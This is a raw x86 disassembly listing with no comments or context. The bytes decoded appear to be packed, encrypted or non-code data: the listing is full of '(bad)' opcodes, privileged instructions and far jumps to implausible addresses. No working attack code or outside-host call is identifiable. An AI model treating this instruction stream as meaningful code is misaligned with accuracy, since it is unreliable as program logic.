  416e2d:	jp     0x416eaa
  416e2f:	and    eax,0xc7599645
  416e34:	inc    esp
  416e35:	mov    bh,0x87
  416e37:	outs   dx,BYTE PTR ds:[esi]
  416e38:	or     eax,0x150b24c9
  416e3d:	sahf   
  416e3e:	mov    ss,WORD PTR [ebx+eiz*2-0x5]
  416e42:	scas   eax,DWORD PTR es:[edi]
  416e43:	jge    0x416ea3
  416e45:	retf   
  416e46:	jae    0x416e74
  416e48:	idiv   BYTE PTR [eax-0x31]
  416e4b:	jle    0x416ea9
  416e4d:	and    edi,ecx
  416e4f:	addr16 mov ebx,0x27366beb
  416e55:	or     BYTE PTR [esi],0x7b
  416e58:	jo     0x416e11
  416e5a:	aaa    
  416e5b:	bound  esp,QWORD PTR [esi+0x1dc8030d]
  416e61:	sub    DWORD PTR [eax+0xd530596],ecx
  416e67:	icebp  
  416e68:	xor    BYTE PTR [edx+ecx*1],bh
  416e6b:	adc    ah,BYTE PTR [esi-0x10]
  416e6e:	stos   BYTE PTR es:[edi],al
  416e6f:	cmp    edx,DWORD PTR [edx+edi*8+0x5096c3e5]
  416e76:	push   edx
  416e77:	data16 aaa 
  416e79:	out    dx,al
  416e7a:	bound  ebx,QWORD PTR [ebx-0x13903290]
  416e80:	sbb    edx,DWORD PTR [ecx+0x4e]
  416e83:	test   edx,ebp
  416e85:	mov    ebp,0xb1739c0d
  416e8a:	jge    0x416f08
  416e8c:	retf   
  416e8d:	adc    dh,BYTE PTR ds:0xcd5b7112
  416e93:	mov    esp,0xbce1828b
  416e98:	sub    al,0x30
  416e9a:	or     BYTE PTR [edi+0x7dcb77dc],ch
  416ea0:	into   
  416ea1:	pop    esi
  416ea2:	cmp    al,0xae
  416ea4:	imul   BYTE PTR [edx+eiz*8]
  416ea7:	hlt    
  416ea8:	cld    
  416ea9:	or     esp,DWORD PTR [ebx-0x7523d3f7]
  416eaf:	fldz   
  416eb1:	fyl2xp1 
  416eb3:	xchg   esp,eax
  416eb4:	mov    bl,0x7f
  416eb6:	(bad)  
  416eb7:	xor    edx,DWORD PTR [esi+0x5d5bec05]
  416ebd:	data16 mov ds:0x638d23f6,al
  416ec3:	not    BYTE PTR [edx]
  416ec5:	mov    al,ds:0x6bc092c
  416eca:	(bad)  
  416ecb:	std    
  416ecc:	stos   DWORD PTR es:[edi],eax
  416ecd:	push   ss
  416ece:	iret   
  416ecf:	inc    esi
  416ed0:	xlat   BYTE PTR ds:[ebx]
  416ed1:	xchg   edx,eax
  416ed2:	mul    DWORD PTR [edi-0x14690bc4]
  416ed8:	mov    ebp,0xa3105498
  416edd:	push   edx
  416ede:	mov    BYTE PTR ss:[esi],bl
  416ee1:	test   eax,0x43e696e4
  416ee6:	daa    
  416ee7:	push   es
  416ee8:	and    cl,ch
  416eea:	div    BYTE PTR [esi-0x61]
  416eed:	mov    eax,ds:0x44e45557
  416ef2:	xchg   esp,eax
  416ef3:	nop
  416ef4:	aaa    
  416ef5:	xor    BYTE PTR [eax+0x65],ch
  416ef8:	retf   0x1861
  416efb:	add    bh,bl
  416efd:	jo     0x416edf
  416eff:	or     DWORD PTR [edx-0x53b38c7e],0xba10cf98
  416f09:	int3   
  416f0a:	aam    0x8
  416f0c:	mov    ch,0x45
  416f0e:	mov    ebx,0x2b23dc53
  416f13:	jmp    0x416ec7
  416f15:	scas   eax,DWORD PTR es:[edi]
  416f16:	sbb    al,0x35
  416f18:	(bad)  
  416f19:	xor    ah,dh
  416f1b:	lds    edi,FWORD PTR [eax]
  416f1d:	and    esp,ebx
  416f1f:	shr    DWORD PTR [ebx],0xe7
  416f22:	(bad)  [ebp-0x71]
  416f25:	mov    BYTE PTR [ebx],dh
  416f27:	mov    al,ch
  416f29:	jne    0x416f19
  416f2b:	inc    ebx
  416f2c:	jne    0x416f6e
  416f2e:	mov    al,ds:0x25742609
  416f33:	clc    
  416f34:	adc    dl,bh
  416f36:	or     al,0x8c
  416f38:	inc    esi
  416f39:	idiv   ebp
  416f3b:	retf   0xd97e
  416f3e:	jecxz  0x416f70
  416f40:	sub    eax,DWORD PTR [ebx-0x21]
  416f43:	ds neg bl
  416f46:	cvtps2pd xmm0,QWORD PTR [esi+eiz*2-0x4bd46257]
  416f4e:	dec    ebp
  416f4f:	pop    ss
  416f50:	pushf  
  416f51:	mov    edi,0x51760aa2
  416f56:	mov    esi,0xf7f572f
  416f5b:	sti    
  416f5c:	stos   BYTE PTR es:[edi],al
  416f5d:	enter  0xeeb2,0xa7
  416f61:	stos   BYTE PTR es:[edi],al
  416f62:	test   dh,ch
  416f64:	adc    ebx,esp
  416f66:	cli    
  416f67:	jmp    0xe687d848
  416f6c:	mov    dh,0x71
  416f6e:	cmp    esp,DWORD PTR [edi-0xd33fa71]
  416f74:	mov    edx,?
  416f76:	jge    0x416fb7
  416f78:	jnp    0x416fb1
  416f7a:	in     al,0xde
  416f7c:	sub    al,0x71
  416f7e:	xor    BYTE PTR [ecx+0x2b],0x4b
  416f82:	push   esi
  416f83:	xchg   ebp,eax
  416f84:	int3   
  416f85:	inc    DWORD PTR [esi-0x58]
  416f88:	out    dx,al
  416f89:	xor    al,0x62
  416f8b:	jae    0x416f9d
  416f8d:	out    dx,al
  416f8e:	mov    al,BYTE PTR [eax-0x7525f12d]
  416f94:	repnz sbb eax,0x55bfeecd
  416f9a:	or     al,0x61
  416f9c:	dec    esi
  416f9d:	or     ah,cl
  416f9f:	mov    dl,0xa7
  416fa1:	inc    esi
  416fa2:	inc    ebp
  416fa3:	pop    esp
  416fa4:	or     ebp,ebx
  416fa6:	nop
  416fa7:	enter  0x88dc,0x63
  416fab:	fnstsw WORD PTR [eax]
  416fad:	xor    al,0x73
  416faf:	mov    ds:0xd86482d3,al
  416fb4:	mov    bh,0xd6
  416fb6:	sbb    BYTE PTR [eax-0x13262ed5],ch
  416fbc:	xchg   ebp,eax
  416fbd:	and    al,0x5b
  416fbf:	test   eax,0x37f453ce
  416fc4:	shl    BYTE PTR [ecx-0x7946cf71],0x2b
  416fcb:	push   ds
  416fcc:	cmp    al,0xc3
  416fce:	es scas eax,DWORD PTR es:[edi]
  416fd0:	adc    ebx,DWORD PTR [edx]
  416fd2:	mov    DWORD PTR [eax+0x68af4615],esi
  416fd8:	adc    eax,0xd8651f4b
  416fdd:	jge    0x416fe9
  416fdf:	mov    ds:0x790326d4,al
  416fe4:	mov    esp,0x1fc766ea
  416fe9:	push   esp
  416fea:	clc    
  416feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fec:	jle    0x416fa5
  416fee:	(bad)  
  416fef:	jns    0x416ff3
  416ff1:	loope  0x41704e
  416ff3:	jo     0x417066
  416ff5:	dec    ebp
  416ff6:	or     BYTE PTR [edx+0x47],0x93
  416ffa:	sbb    BYTE PTR [esi+0x10d344c8],0x86
  417001:	in     eax,dx
  417002:	mov    edi,0xbb375c10
  417007:	inc    ebx
  417008:	gs data16 cmp al,0xe4
  41700c:	retf   0x56d7
  41700f:	ja     0x417060
  417011:	retf   
  417012:	mov    cl,0x14
  417014:	adc    eax,edi
  417016:	mov    BYTE PTR [eax+0xa],bh
  417019:	cmc    
  41701a:	mov    bh,bh
  41701c:	stos   BYTE PTR es:[edi],al
  41701d:	popf   
  41701e:	pop    edx
  41701f:	inc    eax
  417020:	jecxz  0x417031
  417022:	and    BYTE PTR [esi-0x4151bd73],0x78
  417029:	loop   0x416ffc
  41702b:	pminub mm7,mm3
  41702e:	clc    
  41702f:	fwait
  417030:	xchg   ebp,eax
  417031:	adc    ch,al
  417033:	int3   
  417034:	cmc    
  417035:	mov    ebx,0xfc51f159
  41703a:	retf   0xa6aa
  41703d:	mov    cl,0xad
  41703f:	test   al,0x94
  417041:	das    
  417042:	jg     0x416fdd
  417044:	out    dx,al
  417045:	adc    al,0x54
  417047:	call   DWORD PTR gs:[eax-0x19]
  41704b:	es mov dl,0x2b
  41704f:	add    bh,bl
  417051:	retf   
  417052:	sti    
  417053:	inc    ecx
  417054:	out    0xf6,al
  417056:	jecxz  0x417020
  417058:	or     bh,BYTE PTR [ecx]
  41705a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41705c:	aaa    
  41705d:	aaa    
  41705e:	jmp    0x2f1c3d2a
  417063:	ja     0x417049
  417065:	lods   al,BYTE PTR ds:[esi]
  417066:	popf   
  417067:	add    eax,DWORD PTR [ebp+0x3c]
  41706a:	jns    0x41707c
  41706c:	imul   edi,DWORD PTR [edx],0x4d
  41706f:	ins    DWORD PTR es:[edi],dx
  417070:	mov    edx,0xb4ecbcd4
  417075:	in     al,dx
  417076:	sub    al,0xcf
  417078:	cmp    ah,BYTE PTR [edi+ebp*2]
  41707b:	sub    dh,ch
  41707d:	dec    esi
  41707e:	outs   dx,DWORD PTR ds:[esi]
  41707f:	xchg   edi,eax
  417080:	(bad)  
  417082:	mov    edx,0xb1bdbde6
  417087:	jecxz  0x41702b
  417089:	sbb    DWORD PTR [edx+0x40f64be2],0x2f4e6116
  417093:	push   es
  417094:	mov    edi,0x397244cc
  417099:	ins    BYTE PTR es:[edi],dx
  41709a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41709b:	push   edx
  41709c:	mov    ds:0x88e4f48,al
  4170a1:	popa   
  4170a2:	add    eax,0xd63d6e80
  4170a7:	ret    
  4170a8:	mov    ah,0xcb
  4170aa:	js     0x41702c
  4170ac:	xchg   edi,eax
  4170ad:	mov    ebx,0xbeea99c8
  4170b2:	(bad)  
  4170b3:	add    BYTE PTR [edx-0x9],al
  4170b6:	ds je  0x4170ce
  4170b9:	(bad)  
  4170bb:	ret    0x4bea
  4170be:	ins    DWORD PTR es:[edi],dx
  4170bf:	and    DWORD PTR [ecx-0x215b5591],ecx
  4170c5:	loope  0x4170ad
  4170c7:	(bad)  
  4170c8:	fmul   QWORD PTR [edx+eiz*2+0x0]
  4170cc:	dec    ebp
  4170cd:	pop    edx
  4170ce:	(bad)  
  4170cf:	fist   DWORD PTR [edx]
  4170d1:	pop    edx
  4170d2:	push   ebp
  4170d3:	sbb    eax,0x27528c20
  4170d8:	mov    esp,0xde9db73d
  4170dd:	adc    al,BYTE PTR [edx+ecx*2-0x80]
  4170e1:	sub    dh,BYTE PTR [edx]
  4170e3:	mov    edx,0x5704ba34
  4170e8:	std    
  4170e9:	sbb    bh,BYTE PTR [ecx+edi*4-0x69a806e0]
  4170f0:	or     eax,DWORD PTR [ebx+0x933d145]
  4170f6:	adc    eax,0xb7e7f0af
  4170fb:	mov    ds:0x5242f93a,eax
  417100:	sahf   
  417101:	imul   BYTE PTR [edx-0x243625ec]
  417107:	add    al,0xd3
  417109:	cmp    al,0x9d
  41710b:	call   0xb5b912fe
  417110:	inc    ebp
  417111:	popf   
  417112:	mov    ebx,DWORD PTR [ecx-0x7c399422]
  417118:	sub    DWORD PTR [edi],ecx
  41711a:	enter  0x8895,0x79
  41711e:	mov    bh,0x5f
  417120:	mov    edi,0xfb3a310f
  417125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417126:	ret    
  417127:	push   cs
  417128:	xchg   esi,eax
  417129:	xchg   ecx,eax
  41712a:	imul   edx,DWORD PTR [eax+0x25987e27],0x12
  417131:	lahf   
  417132:	mov    edx,0xd31a1979
  417137:	pop    edi
  417138:	jl     0x4171a8
  41713a:	mov    DWORD PTR [ecx+0x4f],0xa07f15a7
  417141:	mov    eax,ds:0x73a9729e
  417146:	(bad)  
  417147:	cmp    eax,0x5f31e3bb
  41714c:	sub    al,0xb6
  41714e:	popa   
  41714f:	sub    eax,0x92f511ff
  417154:	ret    
  417155:	in     eax,0x7e
  417157:	or     BYTE PTR [edx-0x76],ch
  41715a:	mov    ds:0xc55641df,eax
  41715f:	ja     0x417149
  417161:	je     0x417124
  417163:	xchg   BYTE PTR [esi],al
  417165:	jbe    0x4170e9
  417167:	sbb    eax,0xfcefaf23
  41716c:	jmp    0x41713a
  41716e:	aaa    
  41716f:	data16 in al,dx
  417171:	xor    eax,0xa69de2e1
  417176:	pop    ss
  417177:	sub    BYTE PTR [ebx-0x5ace604a],dl
  41717d:	popa   
  41717e:	mov    edi,0xa1bab2ab
  417183:	ins    DWORD PTR es:[edi],dx
  417184:	pusha  
  417185:	mov    edi,0x93685e3d
  41718a:	(bad)  
  41718b:	rcl    DWORD PTR [ebp-0x148a396f],cl
  417191:	adc    DWORD PTR [eax-0x3af01295],ebx
  417197:	and    DWORD PTR [edx],edx
  417199:	jl     0x4171bc
  41719b:	int    0xe5
  41719d:	aas    
  41719e:	xchg   esp,eax
  41719f:	xchg   edi,eax
  4171a0:	sbb    BYTE PTR [esi-0x43efc0c8],0x9e
  4171a7:	jae    0x41716f
  4171a9:	fwait
  4171aa:	cdq    
  4171ab:	addr16 call 0xf6d43031
  4171b1:	inc    ebx
  4171b2:	test   ebp,esi
  4171b4:	or     eax,0x6c34587e
  4171b9:	int3   
  4171ba:	inc    esp
  4171bb:	and    dh,BYTE PTR [ebx+eax*2-0xb]
  4171bf:	xchg   edx,eax
  4171c0:	xchg   edx,eax
  4171c1:	cdq    
  4171c2:	xchg   dh,al
  4171c4:	push   DWORD PTR [ebx*4+0x4ff275af]
  4171cb:	ret    
  4171cc:	sbb    BYTE PTR [edx+ebp*8+0x7029d4a4],dh
  4171d3:	mov    edx,0x366204e1
  4171d8:	ss stos DWORD PTR es:[edi],eax
  4171da:	fsubr  DWORD PTR [esi+0xc]
  4171dd:	jbe    0x41723d
  4171df:	fucom  st(6)
  4171e1:	push   es
  4171e2:	hlt    
  4171e3:	push   ebp
  4171e4:	repnz lahf 
  4171e6:	jmp    0xa17b7971
  4171eb:	jecxz  0x417238
  4171ed:	or     ebp,DWORD PTR [esi+ecx*8]
  4171f0:	(bad)  
  4171f1:	dec    BYTE PTR [edx+eiz*2]
  4171f4:	aaa    
  4171f5:	lock stc 
  4171f7:	push   esi
  4171f8:	sbb    BYTE PTR [ebx-0x1855d8dd],dl
  4171fe:	in     eax,dx
  4171ff:	jmp    0x9ec77332
  417204:	mov    dl,0x8e
  417206:	jb     0x4171c4
  417208:	mov    ah,0x34
  41720a:	fwait
  41720b:	int3   
  41720c:	out    dx,eax
  41720d:	mov    dl,0x29
  41720f:	add    eax,0x39deecc
  417214:	mov    esi,0x3ff697cc
  417219:	retf   0x522f
  41721c:	sti    
  41721d:	retf   0xe0ef
  417220:	sbb    BYTE PTR [edi-0x7128d851],bl
  417226:	fadd   st(7),st
  417228:	enter  0x6453,0xc
  41722c:	mov    edx,0xd1b75e64
  417231:	lock cmp eax,0x599a148f
  417237:	inc    ebp
  417238:	fisubr DWORD PTR [ecx+edx*4-0x4fb0c44d]
  41723f:	push   es
  417240:	inc    ebx
  417241:	cmp    BYTE PTR [ebp-0x1b],cl
  417244:	jg     0x4171cb
  417246:	shr    BYTE PTR [edx+0x631cc546],cl
  41724c:	repnz cmp dl,ah
  41724f:	emms   
  417251:	mov    BYTE PTR [ebx+0x20],al
  417254:	cld    
  417255:	mov    eax,ds:0x645fb4b
  41725a:	and    BYTE PTR [esp-0x3726f1b4],cl
  417261:	mov    ecx,0x85214740
  417266:	cmp    DWORD PTR [edi-0x2a],0xffffffd3
  41726a:	sub    bl,BYTE PTR [esi+esi*8+0x3c963fa7]
  417271:	lods   al,BYTE PTR ds:[esi]
  417272:	ja     0x417201
  417274:	jp     0x417227
  417276:	sub    al,0x6
  417278:	mov    ebp,0x78a4c0e4
  41727d:	xor    ch,dl
  41727f:	ins    BYTE PTR es:[edi],dx
  417280:	sahf   
  417281:	push   ecx
  417282:	retf   0xa14a
  417285:	test   BYTE PTR [eax],dh
  417287:	jecxz  0x417280
  417289:	test   eax,0xe082310d
  41728e:	ins    BYTE PTR es:[edi],dx
  41728f:	dec    edx
  417290:	mov    bl,BYTE PTR [ecx-0x17629524]
  417296:	add    eax,0x7614753d
  41729b:	cli    
  41729c:	xor    al,0x74
  41729e:	xor    bl,ah
  4172a0:	sar    ah,1
  4172a2:	les    edi,FWORD PTR [eax+0x62]
  4172a5:	push   cs
  4172a6:	shl    BYTE PTR [edi-0x3b],cl
  4172a9:	pop    ds
  4172aa:	outs   dx,DWORD PTR ds:[esi]
  4172ab:	cmp    esi,DWORD PTR gs:[edi]
  4172ae:	sbb    eax,DWORD PTR [edi-0x59]
  4172b1:	test   al,0xf6
  4172b3:	push   ss
  4172b4:	stos   BYTE PTR es:[edi],al
  4172b5:	lods   al,BYTE PTR ds:[esi]
  4172b6:	repz in al,0xde
  4172b9:	cmp    BYTE PTR [ebp+eax*4-0x69],al
  4172bd:	popf   
  4172be:	dec    esp
  4172bf:	stos   DWORD PTR es:[edi],eax
  4172c0:	mov    ch,0xee
  4172c2:	mov    DWORD PTR [esi+0x64],edi
  4172c5:	lds    ebp,FWORD PTR [edi-0x6a]
  4172c8:	pop    edi
  4172c9:	mov    al,0xcb
  4172cb:	(bad)  
  4172cd:	pop    ecx
  4172ce:	jecxz  0x41731f
  4172d0:	inc    ecx
  4172d1:	loopne 0x417307
  4172d3:	pop    eax
  4172d4:	fnstsw WORD PTR [ebx+0x624e775b]
  4172da:	ds sbb eax,0xcf733226
  4172e0:	pop    esp
  4172e1:	jmp    0x3378:0xa1647bde
  4172e8:	mov    edx,0xba4b3f59
  4172ed:	push   eax
  4172ee:	call   0xe8f0:0xe10ae518
  4172f5:	mov    WORD PTR [edi+ecx*4+0x637e0f15],ds
  4172fc:	add    BYTE PTR [edi+0xe],dh
  4172ff:	es sbb al,bh
  417302:	jne    0x41731f
  417304:	push   ecx
  417305:	dec    esp
  417306:	sub    al,0x70
  417308:	sbb    DWORD PTR [eax-0x31],esi
  41730b:	lods   eax,DWORD PTR ds:[esi]
  41730c:	mov    cl,bl
  41730e:	jb     0x4172dc
  417310:	ret    0xb490
  417313:	push   0x17
  417315:	ja     0x41736a
  417317:	sbb    dl,BYTE PTR [esi+edx*8-0x5]
  41731b:	lahf   
  41731c:	daa    
  41731d:	dec    eax
  41731e:	mov    esi,0x9ce1fa0a
  417323:	stos   BYTE PTR es:[edi],al
  417324:	in     eax,dx
  417325:	xor    eax,0xb346f171
  41732b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41732c:	push   ecx
  41732d:	jp     0x417391
  41732f:	mov    gs,WORD PTR [ebp+0x12]
  417332:	mov    esi,0xbd1e496d
  417337:	out    0xb9,al
  417339:	mov    al,0xdd
  41733b:	mov    esi,0x64b77554
  417340:	xlat   BYTE PTR ds:[ebx]
  417341:	fldcw  WORD PTR [eax]
  417343:	frstpm(287 only) 
  417345:	call   FWORD PTR [ebx+0x36adbb3e]
  41734b:	dec    esi
  41734c:	push   ecx
  41734d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41734e:	jp     0x417361
  417350:	or     eax,0x2d3ed785
  417355:	or     BYTE PTR [eax+0x49],cl
  417358:	sub    BYTE PTR [edx-0x2b],cl
  41735b:	aaa    
  41735c:	jnp    0x4173d9
  41735e:	retf   0x4551
  417361:	xor    eax,0x4db80273
  417366:	fst    DWORD PTR [ecx+0x46]
  417369:	retf   0x16e8
  41736c:	rcl    BYTE PTR [edi-0x13],cl
  41736f:	jne    0x41730e
  417371:	shl    DWORD PTR [ebp+0x66d33c38],1
  417377:	push   es
  417378:	loop   0x417388
  41737a:	jl     0x4173df
  41737c:	in     eax,0xad
  41737e:	jmp    0x417356
  417380:	cs clc 
  417382:	push   0xffffff82
  417384:	ja     0x4173cb
  417386:	push   esp
  417387:	loop   0x4173a3
  417389:	mov    ebx,0x619a7fec
  41738e:	dec    edi
  41738f:	and    al,0xb9
  417391:	mov    ah,BYTE PTR [ebx-0x21f37763]
  417397:	or     DWORD PTR [eax+edx*1+0x7],edi
  41739b:	inc    eax
  41739c:	outs   dx,BYTE PTR ds:[esi]
  41739d:	iret   
  41739e:	mov    dl,0x70
  4173a0:	fucompp 
  4173a2:	arpl   dx,bx
  4173a4:	retf   
  4173a5:	dec    esi
  4173a6:	fild   QWORD PTR [esi-0x20]
  4173a9:	out    0x86,eax
  4173ab:	xchg   esi,eax
  4173ac:	(bad)  
  4173ad:	fld    DWORD PTR [ebp+0x63]
  4173b0:	dec    ecx
  4173b1:	mov    ebp,0x9a94cc6d
  4173b6:	add    BYTE PTR [esi],0x91
  4173b9:	cmc    
  4173ba:	test   DWORD PTR [edx-0x650e9683],edx
  4173c0:	jno    0x4173f7
  4173c2:	test   dh,ch
  4173c4:	stos   BYTE PTR es:[edi],al
  4173c5:	loopne 0x4173d7
  4173c7:	ret    
  4173c8:	sbb    ebp,ecx
  4173ca:	add    esp,DWORD PTR [ecx]
  4173cc:	mov    dl,0xd3
  4173ce:	and    BYTE PTR [esi+ebx*2-0x64],bh
  4173d2:	xchg   edx,eax
  4173d3:	sbb    dh,bh
  4173d5:	arpl   WORD PTR [esi-0x15],bp
  4173d8:	mov    esi,0x94a4bc6c
  4173dd:	and    esi,DWORD PTR [ebx+0x45f8726e]
  4173e3:	or     ch,BYTE PTR ds:0xb6a0e096
  4173e9:	popa   
  4173ea:	outs   dx,BYTE PTR ds:[esi]
  4173eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ec:	aaa    
  4173ed:	das    
  4173ee:	jbe    0x4173be
  4173f0:	mov    DWORD PTR [edi+esi*1+0x2ef12c7f],ebp
  4173f7:	iret   
  4173f8:	(bad)  
  4173f9:	clc    
  4173fa:	pop    ecx
  4173fb:	wbinvd 
  4173fd:	add    ebx,ebp
  4173ff:	jl     0x41738d
  417401:	aaa    
  417402:	test   esi,ebp
  417404:	xor    DWORD PTR [ebx+0x4bd74b62],esi
  41740a:	std    
  41740b:	jae    0x417428
  41740d:	in     al,dx
  41740e:	(bad)
  417412:	push   ds
  417413:	xor    edi,ecx
  417415:	dec    ecx
  417416:	sub    ah,BYTE PTR [esi]
  417418:	(bad)  
  417419:	fisubr DWORD PTR ds:0x3b7e80c2
  41741f:	(bad)  
  417420:	aad    0xa9
  417422:	xchg   ebp,eax
  417423:	jge    0x417457
  417425:	es cmp al,0x66
  417428:	jbe    0x417420
  41742a:	or     al,0xa6
  41742c:	xor    eax,0xed43f755
  417431:	push   cs
  417432:	fcmovu st,st(6)
  417434:	inc    esp
  417435:	shl    DWORD PTR [esi+0x3f],0x89
  417439:	sub    eax,edi
  41743b:	xchg   ecx,eax
  41743c:	test   DWORD PTR [eax],ecx
  41743e:	arpl   WORD PTR [esi+0x3f],si
  417441:	jl     0x4173fc
  417443:	sahf   
  417444:	pop    esp
  417445:	cmp    eax,0x3f15c044
  41744a:	leave  
  41744b:	pop    edx
  41744c:	popa   
  41744d:	lods   al,BYTE PTR ds:[esi]
  41744e:	pop    ecx
  41744f:	xor    edx,ecx
  417451:	dec    ebx
  417452:	lock enter 0xd909,0x9f
  417457:	jb     0x417494
  417459:	popf   
  41745a:	mov    al,ds:0x870c492b
  41745f:	loope  0x4174c1
  417461:	cmp    esi,DWORD PTR [esi-0x7e]
  417464:	pop    edx
  417465:	dec    edi
  417466:	mov    ebp,0xd89d64bf
  41746b:	int    0x2a
  41746d:	into   
  41746e:	jl     0x4173f8
  417470:	loopne 0x417473
  417472:	and    edi,ebx
  417474:	sub    al,0x13
  417476:	mov    esp,0x3aba57a6
  41747b:	pop    eax
  41747c:	fistp  WORD PTR [edx+0x5ce7f648]
  417482:	pop    esp
  417483:	jp     0x417454
  417485:	ficomp DWORD PTR [edi]
  417487:	repnz loop 0x417424
  41748a:	push   esp
  41748b:	mov    ch,BYTE PTR [eax+0x66]
  41748e:	into   
  41748f:	dec    ebx
  417490:	div    DWORD PTR [ebx]
  417492:	jnp    0x4174e7
  417494:	add    esi,esi
  417496:	jecxz  0x41747a
  417498:	fcomp  DWORD PTR [edx]
  41749a:	outs   dx,BYTE PTR ds:[esi]
  41749b:	pop    ebx
  41749c:	inc    esi
  41749d:	test   al,al
  41749f:	(bad)  
  4174a0:	aas    
  4174a1:	test   al,0x3c
  4174a3:	icebp  
  4174a4:	push   eax
  4174a5:	mov    ecx,0xc10f8730
  4174aa:	xchg   edx,eax
  4174ab:	mov    ch,0xd4
  4174ad:	(bad)  
  4174ae:	mov    ecx,0xd44ddc1e
  4174b3:	lahf   
  4174b4:	fmul   st(5),st
  4174b6:	repnz mov al,0x75
  4174b9:	fneni(8087 only) 
  4174bb:	aaa    
  4174bc:	js     0x4174e5
  4174be:	dec    edx
  4174bf:	xchg   edx,edx
  4174c1:	mov    eax,ds:0x54b46e05
  4174c6:	or     al,0xab
  4174c8:	je     0x41753d
  4174ca:	test   al,0x50
  4174cc:	shrd   DWORD PTR [ebx+0xb],edi,0xfe
  4174d1:	pop    esp
  4174d2:	outs   dx,DWORD PTR ds:[esi]
  4174d3:	mov    ebp,0x5f643e16
  4174d8:	test   DWORD PTR [ebp-0x1e],0xa2b9288f
  4174df:	or     DWORD PTR ds:0xec9a08cf,ebp
  4174e5:	stos   BYTE PTR es:[edi],al
  4174e6:	sbb    eax,0x69bacdd8
  4174eb:	cmp    eax,0x97f39fc1
  4174f0:	jecxz  0x417482
  4174f2:	dec    esi
  4174f3:	mov    al,ds:0x7823eb28
  4174f8:	stos   BYTE PTR es:[edi],al
  4174f9:	xchg   edx,eax
  4174fa:	bound  edx,QWORD PTR [ebx]
  4174fc:	shr    DWORD PTR [edi-0x6b],cl
  4174ff:	mov    DWORD PTR [edx],ebx
  417501:	jmp    0x41757b
  417503:	pushf  
  417504:	je     0x417543
  417506:	mov    al,0xc3
  417508:	jmp    0x417534
  41750a:	xchg   DWORD PTR [ebp+0x71],ecx
  41750d:	fnstenv [ecx*1-0x5b8cbd8c]
  417514:	dec    esi
  417515:	xchg   edi,eax
  417516:	fldenv [ebx]
  417518:	in     eax,dx
  417519:	mov    WORD PTR [edi],ss
  41751b:	mov    esi,0xc35492bc
  417520:	ret    
  417521:	mul    ecx
  417523:	fucom  st(0)
  417525:	cld    
  417526:	gs js  0x41755d
  417529:	sti    
  41752a:	(bad)  
  41752b:	outs   dx,BYTE PTR ds:[esi]
  41752c:	test   BYTE PTR ds:0x780b4b6f,ch
  417532:	test   DWORD PTR [ebx*2+0x52637126],edx
  417539:	sbb    al,0xd2
  41753c:	xchg   edx,eax
  41753d:	sbb    ebx,DWORD PTR [esi-0x4c82dee2]
  417543:	hlt    
  417544:	enter  0x1884,0xd4
  417548:	sub    BYTE PTR [esp+eax*2-0x2b],dh
  41754c:	or     BYTE PTR [eax-0xd4ccd05],dl
  417552:	adc    edx,DWORD PTR [esi+0x4445001e]
  417558:	fs xchg edi,eax
  41755a:	ror    DWORD PTR [ecx],0xc7
  41755d:	shl    BYTE PTR [ebx+0xc],cl
  417560:	jnp    0x4175d3
  417562:	nop
  417563:	xor    esp,eax
  417565:	pop    ds
  417566:	push   ss
  417567:	and    DWORD PTR [esi-0x36],ebx
  41756a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41756b:	mov    bh,0xb4
  41756d:	rcr    BYTE PTR [ebp+0x16dc915f],1
  417573:	fstp   TBYTE PTR [eax+ecx*2-0x3b]
  417577:	pop    esi
  417578:	jle    0x4175ee
  41757a:	mov    eax,0xa50c2e5e
  41757f:	sbb    DWORD PTR [edx+0x2414c953],edi
  417585:	(bad)  
  417586:	popf   
  417587:	(bad)  
  417588:	jmp    0x9f0eacb6
  41758d:	int3   
  41758e:	lods   al,BYTE PTR ds:[esi]
  41758f:	enter  0x65e4,0xa0
  417593:	lahf   
  417594:	sbb    al,0xfa
  417596:	jmp    0x72dd4c22
  41759b:	int3   
  41759c:	inc    ebx
  41759d:	mov    bh,BYTE PTR [edi]
  41759f:	inc    edi
  4175a0:	push   ebx
  4175a1:	push   ds
  4175a2:	dec    edi
  4175a3:	cmp    eax,ebx
  4175a5:	xor    DWORD PTR ss:[esi],0xdcfcd3c9
  4175ac:	aaa    
  4175ad:	loopne 0x417536
  4175af:	into   
  4175b0:	add    DWORD PTR [ebx+ebp*8-0x2d],eax
  4175b4:	dec    esi
  4175b5:	nop
  4175b6:	jecxz  0x41761c
  4175b8:	mov    dl,0xe1
  4175ba:	inc    edi
  4175bb:	call   0xfada3bc
  4175c0:	add    ah,ch
  4175c2:	sbb    al,dl
  4175c4:	inc    ebx
  4175c5:	jbe    0x417579
  4175c7:	mov    BYTE PTR [esi-0x26903952],bh
  4175cd:	dec    ecx
  4175ce:	push   ecx
  4175cf:	outs   dx,BYTE PTR ds:[esi]
  4175d0:	jp     0x4175fe
  4175d2:	xchg   edx,eax
  4175d3:	adc    dh,BYTE PTR [ebx-0x5]
  4175d6:	and    al,0x98
  4175d8:	sub    al,0x6d
  4175da:	fisub  WORD PTR [edx]
  4175dc:	outs   dx,DWORD PTR ds:[esi]
  4175dd:	or     ebp,eax
  4175df:	xchg   edi,eax
  4175e0:	fsubr  st,st(0)
  4175e2:	or     eax,0x6a4f6df7
  4175e7:	sahf   
  4175e8:	mov    ebp,0x52f3ad4
  4175ed:	pop    esp
  4175ee:	fmulp  st(1),st
  4175f0:	mov    ds:0xf5e6e4ee,eax
  4175f5:	lods   eax,DWORD PTR ds:[esi]
  4175f6:	push   ebx
  4175f7:	movups xmm7,XMMWORD PTR [edx+0x35]
  4175fb:	ja     0x417622
  4175fd:	mov    al,ds:0x48ad684a
  417602:	loope  0x4175b5
  417604:	bound  edx,QWORD PTR [edi-0x5855d738]
  41760a:	clc    
  41760b:	pop    ebp
  41760c:	adc    BYTE PTR [esi+0x384dd55b],dl
  417612:	lock fimul WORD PTR [edx-0x42]
  417616:	stos   DWORD PTR es:[edi],eax
  417617:	out    0x7,al
  417619:	cs or  eax,0xb26c53d6
  41761f:	cmp    ebp,eax
  417621:	inc    edi
  417622:	jecxz  0x41764b
  417624:	lock sti 
